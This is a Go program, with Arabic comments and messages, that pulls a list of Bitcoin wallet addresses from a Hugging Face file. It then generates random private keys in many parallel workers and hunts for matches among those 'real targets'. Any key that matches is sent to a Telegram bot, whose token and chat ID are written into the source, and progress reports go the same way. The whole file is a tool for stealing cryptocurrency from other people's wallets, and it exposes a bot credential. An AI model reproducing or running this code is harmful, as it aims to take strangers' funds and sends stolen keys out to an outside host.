package main

import (
	"archive/zip"
	"bufio"
	"bytes"
	"crypto/sha256"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"runtime"
	"strings"
	"sync/atomic"
	"time"

	"github.com/btcsuite/btcd/btcec/v2"
	"github.com/btcsuite/btcd/btcutil/base58"
	"golang.org/x/crypto/ripemd160"
)

var (
	totalChecked uint64
	startTime    = time.Now()
	token        = "5921618897:AAGu6bp5gFtatio22y-XdWUSwAd0Lk6b1HY"
	chatID       = "227172927"
	fileURL      = "https://huggingface.co/spaces/OSAMA714/4524/resolve/main/wallets.zip?download=true"
)

func hash160(data []byte) []byte {
	h256 := sha256.Sum256(data)
	hasher := ripemd160.New()
	hasher.Write(h256[:])
	return hasher.Sum(nil)
}

func encodeAddress(pubKey []byte) string {
	return base58.CheckEncode(hash160(pubKey), 0x00)
}

func main() {
	cores := runtime.NumCPU()
	runtime.GOMAXPROCS(cores)

	sendTelegram("🛠️ جاري تجهيز 5 مليون هدف (نظام الاستقرار القصوى)...")

	client := &http.Client{Timeout: 10 * time.Minute}
	resp, err := client.Get(fileURL)
	if err != nil {
		sendTelegram("❌ خطأ في تحميل ملف الأهداف")
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	zipReader, _ := zip.NewReader(bytes.NewReader(body), int64(len(body)))

	// تحديد 5 مليون عنوان لضمان عدم انهيار السيرفر (Killed)
	const MaxTargets = 5000000
	targets := make(map[string]struct{}, MaxTargets)
	
	count := 0
	for _, f := range zipReader.File {
		rc, _ := f.Open()
		scanner := bufio.NewScanner(rc)
		for scanner.Scan() && count < MaxTargets {
			addr := strings.TrimSpace(scanner.Text())
			if len(addr) > 25 {
				targets[addr] = struct{}{}
				count++
			}
		}
		rc.Close()
		if count >= MaxTargets { break }
	}

	sendTelegram(fmt.Sprintf("✅ تم تفعيل %d هدف حقيقي!\n🚀 انطلق الصيد (بدون أخطاء)...", count))

	// تقرير كل 3 دقائق
	go func() {
		for {
			time.Sleep(3 * time.Minute)
			sendReport()
		}
	}()

	// تشغيل العمال (نظام التوربو)
	for i := 0; i < cores*30; i++ {
		go func() {
			for {
				priv, _ := btcec.NewPrivateKey()
				
				// 1. Compressed
				addrC := encodeAddress(priv.PubKey().SerializeCompressed())
				if _, found := targets[addrC]; found {
					sendFound(addrC, "Compressed", priv)
				}

				// 2. Uncompressed
				addrU := encodeAddress(priv.PubKey().SerializeUncompressed())
				if _, found := targets[addrU]; found {
					sendFound(addrU, "Uncompressed", priv)
				}

				atomic.AddUint64(&totalChecked, 1)
			}
		}()
	}
	select {} // إبقاء السكربت يعمل للأبد
}

func sendReport() {
	elapsed := time.Since(startTime).Seconds()
	total := atomic.LoadUint64(&totalChecked)
	speed := float64(total) / elapsed
	
	report := fmt.Sprintf("📊 *تقرير الصيد الحقيقي*\n"+
		"━━━━━━━━━━━━━━━\n"+
		"🚀 السرعة: %.0f K/s\n"+
		"💎 الإجمالي: %d\n"+
		"⏱ المدة: %.1f دقيقة", 
		speed, total, elapsed/60)
	
	sendTelegram(report)
}

func sendTelegram(text string) {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s", 
		token, chatID, url.QueryEscape(text))
	http.Get(apiURL)
}

func sendFound(addr string, kind string, priv *btcec.PrivateKey) {
	msg := fmt.Sprintf("💰 [JACKPOT CONFIRMED]!\n\nAddr: %s\nKey: %x", addr, priv.Serialize())
	sendTelegram(msg)
}
